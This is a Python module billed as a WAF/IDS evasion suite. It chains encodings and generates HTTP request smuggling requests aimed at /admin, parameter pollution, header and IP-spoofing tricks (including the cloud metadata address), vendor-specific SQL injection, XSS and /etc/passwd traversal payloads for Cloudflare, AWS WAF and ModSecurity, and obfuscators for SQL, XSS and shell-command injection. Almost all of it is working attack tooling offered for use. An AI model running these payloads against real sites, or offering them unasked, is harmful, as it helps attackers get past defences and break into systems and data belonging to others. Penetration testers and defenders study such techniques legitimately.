"""
APEX WAF/IDS Evasion Suite
Encoding chains, request smuggling, parameter pollution, WAF-specific bypasses
"""
import random
import re
from urllib.parse import quote


class WAFEvasion:
    """Comprehensive WAF and IDS evasion techniques."""

    def __init__(self):
        self.encoding_techniques = {
            'url_encode': lambda p: quote(p, safe=''),
            'double_url': lambda p: quote(quote(p, safe=''), safe=''),
            'unicode_escape': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
            'hex_escape': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
            'html_entity': lambda p: ''.join(f'&#{ord(c)};' for c in p),
            'html_entity_hex': lambda p: ''.join(f'&#x{ord(c):02x};' for c in p),
            'base64': lambda p: __import__('base64').b64encode(p.encode()).decode(),
            'utf16': lambda p: ''.join(f'%u{ord(c):04x}' for c in p),
            'utf8_overlong': lambda p: ''.join(f'%c0%{ord(c) & 0x3f | 0x80:02x}' for c in p),
            'mixed_case': lambda p: ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
            'tab_replace': lambda p: p.replace(' ', '\t'),
            'comment_inject': lambda p: p.replace(' ', '/**/'),
            'newline_inject': lambda p: p.replace(' ', '%0a'),
            'null_byte': lambda p: p.replace(' ', '%00'),
        }

    def get_evasion_chain(self, vuln_type, waf=None, level=2):
        """Get optimal encoding chain based on vuln type and WAF."""
        chains = {
            'xss': {
                1: ['url_encode'],
                2: ['html_entity', 'mixed_case'],
                3: ['double_url', 'unicode_escape', 'html_entity_hex'],
            },
            'sqli': {
                1: ['url_encode'],
                2: ['comment_inject', 'mixed_case'],
                3: ['double_url', 'comment_inject', 'newline_inject'],
            },
            'cmdi': {
                1: ['url_encode'],
                2: ['newline_inject', 'tab_replace'],
                3: ['double_url', 'newline_inject', 'null_byte'],
            },
            'lfi': {
                1: ['url_encode'],
                2: ['double_url', 'utf8_overlong'],
                3: ['double_url', 'utf8_overlong', 'null_byte'],
            },
        }

        # WAF-specific overrides
        if waf == 'Cloudflare':
            chains['sqli'][2] = ['comment_inject', 'mixed_case', 'newline_inject']
            chains['xss'][2] = ['html_entity', 'mixed_case', 'unicode_escape']
        elif waf == 'ModSecurity':
            chains['sqli'][2] = ['tab_replace', 'newline_inject']
        elif waf == 'AWS WAF':
            chains['sqli'][2] = ['comment_inject', 'mixed_case']
            chains['xss'][2] = ['html_entity_hex', 'unicode_escape']

        return chains.get(vuln_type, {}).get(min(level, 3), ['url_encode'])

    def apply_evasion(self, payload, vuln_type, waf=None, level=2):
        """Apply evasion techniques to a payload."""
        chain = self.get_evasion_chain(vuln_type, waf, level)
        result = payload
        for technique in chain:
            if technique in self.encoding_techniques:
                result = self.encoding_techniques[technique](result)
        return result

    def generate_parameter_pollution(self, param, payload):
        """Generate HTTP parameter pollution variants."""
        return [
            f'{param}={payload}',
            f'{param}={payload}&{param}=legit',
            f'{param}=legit&{param}={payload}',
            f'{param}={quote(payload)}',
            f'{param}[0]={payload}',
            f'{param}[]={payload}',
            f'{param}={payload}&{param}={payload}',
        ]

    def generate_header_variants(self, header_name, payload):
        """Generate header injection variants."""
        return [
            {header_name: payload},
            {header_name: f' {payload}'},
            {header_name: f'\t{payload}'},
            {header_name: f'{payload}\r\n'},
            {f'{header_name} ': payload},
            {f' {header_name}': payload},
            {f'X-{header_name}': payload},
            {f'X-Originating-{header_name}': payload},
        ]

    def generate_content_type_bypass(self, original_type='application/json'):
        """Generate Content-Type bypass variants."""
        return [
            original_type,
            original_type + '; charset=utf-8',
            original_type + '; charset=ibm500',
            original_type.replace('/', '/ '),
            original_type.replace('/', '/\t'),
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'text/xml',
            'application/xml',
            'text/plain',
            '*/*',
            original_type + ', */*',
        ]

    def generate_smuggling_variants(self, target_host, target_path='/'):
        """Generate HTTP request smuggling payloads."""
        return [
            # CL.TE
            f"POST {target_path} HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            # TE.CL
            f"POST {target_path} HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
            # TE.TE obfuscation
            f"POST {target_path} HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: {target_host}\r\n\r\n0\r\n\r\n",
            # Transfer-Encoding with tab
            f"POST {target_path} HTTP/1.1\r\nHost: {target_host}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n5c\r\nGPOST /admin HTTP/1.1\r\nHost: {target_host}\r\n\r\n0\r\n\r\n",
        ]

    def generate_cloudflare_bypass_payloads(self, vuln_type):
        """Cloudflare-specific bypass payloads."""
        bypasses = {
            'sqli': [
                "/*!50000SELECT*/ 1",
                "/*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3",
                "%55NION%53ELECT 1,2,3",
                "UNION(SELECT 1,2,3)",
                "UNION ALL SELECT 1,2,3--",
            ],
            'xss': [
                '<svg onload=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                '<svg><animatetransform onbegin=alert(1)>',
                '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            ],
            'lfi': [
                '....//....//....//etc/passwd',
                '..%252f..%252f..%252fetc/passwd',
                '/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            ],
        }
        return bypasses.get(vuln_type, [])

    def generate_aws_waf_bypass_payloads(self, vuln_type):
        """AWS WAF-specific bypass payloads."""
        bypasses = {
            'sqli': [
                "1' OR '1'='1'--",
                "1' OR 1=1--",
                "1' AND 1=1--",
                "1' UNION SELECT NULL--",
            ],
            'xss': [
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                '<svg/onload=alert(1)>',
            ],
        }
        return bypasses.get(vuln_type, [])

    def generate_modsecurity_bypass_payloads(self, vuln_type):
        """ModSecurity-specific bypass payloads."""
        bypasses = {
            'sqli': [
                "1'%09OR%091=1--",
                "1'%0aOR%0a1=1--",
                "1'/**/OR/**/1=1--",
                "1' OR 1=1#",
            ],
            'xss': [
                '<img src=x onerror=alert(1) >',
                '<svg onload=alert(1) >',
                '<script >alert(1)</script>',
            ],
        }
        return bypasses.get(vuln_type, [])

    def obfuscate_sql(self, query):
        """Obfuscate SQL query to evade detection."""
        obfuscations = [
            query.replace(' ', '/**/'),
            query.replace(' ', '%09'),
            query.replace(' ', '%0a'),
            query.replace(' ', '+'),
            query.replace('SELECT', 'SeLeCt'),
            query.replace('UNION', 'UnIoN'),
            query.replace('FROM', 'FrOm'),
            query.replace('WHERE', 'WhErE'),
            query.replace('OR', '||'),
            query.replace('AND', '&&'),
            query.replace('=', ' LIKE '),
            query.replace('--', '#'),
        ]
        return obfuscations

    def obfuscate_xss(self, payload):
        """Obfuscate XSS payload to evade detection."""
        obfuscations = [
            payload,
            payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'),
            payload.replace('alert', '\\u0061lert'),
            payload.replace('alert', '\\x61lert'),
            payload.replace('alert', 'prompt'),
            payload.replace('alert', 'confirm'),
            payload.replace('onerror', 'onerror '),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace('<', '<').replace('>', '>'),
            f'<img src=x onerror={{"alert".replace("a","a")}}(1)>',
            f'<svg/onload={{"alert".replace("a","a")}}(1)>',
            f'<body onload={{"alert".replace("a","a")}}(1)>',
            f'<details open ontoggle={{"alert".replace("a","a")}}(1)>',
            f'<marquee onstart={{"alert".replace("a","a")}}(1)>',
            f'<video><source onerror={{"alert".replace("a","a")}}(1)>',
            f'<audio src=x onerror={{"alert".replace("a","a")}}(1)>',
            f'<iframe srcdoc="<script>alert(1)</script>">',
            f'<object data="javascript:alert(1)">',
            f'<embed src="javascript:alert(1)">',
        ]
        return obfuscations

    def obfuscate_command(self, cmd):
        """Obfuscate command injection to evade detection."""
        obfuscations = [
            cmd,
            cmd.replace(';', '%0a'),
            cmd.replace(';', '&'),
            cmd.replace(';', '|'),
            cmd.replace(' ', '${IFS}'),
            cmd.replace(' ', '\t'),
            cmd.replace(' ', '%09'),
            cmd.replace('cat', 'c\\at'),
            cmd.replace('cat', "c'a't"),
            cmd.replace('cat', 'c"a"t'),
            cmd.replace('id', 'i\\d'),
            cmd.replace('id', "i''d"),
            cmd.replace('/', '${HOME:0:1}'),
            cmd.replace('etc', 'e\\tc'),
            cmd.replace('passwd', 'passw\\d'),
        ]
        return obfuscations

    def generate_ip_spoof_headers(self):
        """Generate IP spoofing headers to bypass IP-based restrictions."""
        return {
            'X-Forwarded-For': random.choice([
                '127.0.0.1', 'localhost', '0.0.0.0', '10.0.0.1',
                '192.168.1.1', '172.16.0.1', '169.254.169.254',
            ]),
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Host': '127.0.0.1',
            'X-Forwarded-Host': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
        }

    def generate_path_traversal_variants(self, path):
        """Generate path traversal variants to bypass filters."""
        return [
            path,
            path.replace('../', '....//'),
            path.replace('../', '..%2f'),
            path.replace('../', '..%252f'),
            path.replace('../', '%2e%2e%2f'),
            path.replace('../', '%2e%2e/'),
            path.replace('../', '..\\/'),
            path.replace('../', '..;/'),
            path.replace('../', '..%00/'),
            path.replace('../', '..%2500/'),
            path.replace('/', '\\'),
            path.replace('.', '%2e'),
            path.replace('/', '%2f'),
        ]


# Global instance
waf_evasion = WAFEvasion()